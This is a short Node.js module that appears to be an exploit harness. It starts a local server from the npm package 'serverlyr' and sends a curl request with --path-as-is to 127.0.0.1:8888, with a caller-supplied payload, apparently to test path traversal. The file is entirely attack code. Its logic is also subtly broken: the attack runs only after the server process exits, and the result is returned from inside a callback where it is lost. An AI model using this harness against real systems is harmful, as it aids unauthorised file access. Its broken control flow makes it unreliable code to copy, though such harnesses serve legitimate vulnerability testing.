function exploitFunction(payload) {
  const { sleep } = require("sleep");
  const path = require("path");
  const { exec } = require("child_process");

  const serverCommand = "node ./node_modules/serverlyr/index.js";
  const attackString = `curl -v --path-as-is "http://127.0.0.1:8888${payload}"`;

  // Start the server
  exec(serverCommand, (error, stdout) => {
    if (error) {
      console.error(`Error starting server: ${error}`);
      return;
    }

    sleep.sleep(2); // Wait for the server to start

    // Perform the attack
    exec(attackString, (error, stdout) => {
      if (error) {
        console.error(`Error during attack: ${error}`);
        return;
      }

      // Return the output of the attack
      return stdout;
    });
  });
}

module.exports = { exploitFunction };